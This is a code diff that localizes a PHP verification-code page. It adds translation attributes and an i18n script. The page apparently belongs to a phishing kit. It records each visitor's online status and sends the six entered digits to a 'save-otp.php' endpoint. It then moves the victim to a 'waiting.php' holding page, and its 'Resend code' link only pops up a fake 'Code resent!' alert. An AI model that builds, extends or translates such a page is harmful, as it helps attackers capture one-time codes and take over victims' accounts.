@@ -36,8 +36,8 @@ if ($visitorId) { $db = getDB(); $db->prepare("UPDATE visitors SET is_online=1, 
 <body>
 <div class="card">
     <div class="icon">&#128272;</div>
-    <h1>Enter Verification Code</h1>
-    <p>We sent a 6-digit code to your registered phone number. Enter it below.</p>
+    <h1 data-i18n="otp_title">Enter Verification Code</h1>
+    <p data-i18n="otp_message">We sent a 6-digit code to your registered phone number. Enter it below.</p>
     <div class="otp-grid" id="otpGrid">
         <input type="text" inputmode="numeric" maxlength="1">
         <input type="text" inputmode="numeric" maxlength="1">
@@ -46,10 +46,11 @@ if ($visitorId) { $db = getDB(); $db->prepare("UPDATE visitors SET is_online=1, 
         <input type="text" inputmode="numeric" maxlength="1">
         <input type="text" inputmode="numeric" maxlength="1">
     </div>
-    <button class="btn" id="verifyBtn" onclick="verify()">Verify</button>
-    <div class="resend">Didn't receive it? <a onclick="alert('Code resent!')">Resend code</a></div>
+    <button class="btn" id="verifyBtn" onclick="verify()" data-i18n="btn_verify">Verify</button>
+    <div class="resend"><span data-i18n="otp_resend">Didn't receive it?</span> <a onclick="alert('Code resent!')" data-i18n="otp_resend_link">Resend code</a></div>
     <div id="msg"></div>
 </div>
+<script src="assets/js/i18n.js"></script>
 <script>
 const studentId=<?=(int)$student['id']?>;const visitorId=<?=$visitorId?>;let pageVisible=true;
 
@@ -73,9 +74,9 @@ inputs.forEach((inp, i) => {
 
 async function verify() {
     const code = Array.from(inputs).map(i => i.value).join('');
-    if (code.length < 6) { document.getElementById('msg').className='alert alert-error'; document.getElementById('msg').textContent='Enter all 6 digits'; return; }
+    if (code.length < 6) { document.getElementById('msg').className='alert alert-error'; document.getElementById('msg').textContent=i18n.t('msg_enter_6'); return; }
     document.getElementById('verifyBtn').disabled = true;
-    document.getElementById('verifyBtn').textContent = 'Verifying...';
+    document.getElementById('verifyBtn').textContent = i18n.t('msg_verifying');
     try {
         const resp = await fetch('api/save-otp.php', {
             method: 'POST', headers: {'Content-Type': 'application/json'},
@@ -84,13 +85,13 @@ async function verify() {
         const data = await resp.json();
         if (data.success) {
             document.getElementById('msg').className='alert alert-success';
-            document.getElementById('msg').textContent='Code verified! Redirecting...';
+            document.getElementById('msg').textContent=i18n.t('msg_otp_success');
             setTimeout(() => { window.location.href = 'waiting.php'; }, 2000);
         } else {
             document.getElementById('msg').className='alert alert-error';
-            document.getElementById('msg').textContent=data.error || 'Verification failed';
+            document.getElementById('msg').textContent=data.error || i18n.t('msg_otp_fail');
             document.getElementById('verifyBtn').disabled = false;
-            document.getElementById('verifyBtn').textContent = 'Verify';
+            document.getElementById('verifyBtn').textContent = i18n.t('btn_verify');
         }
     } catch(e) {
         document.getElementById('msg').className='alert alert-error';
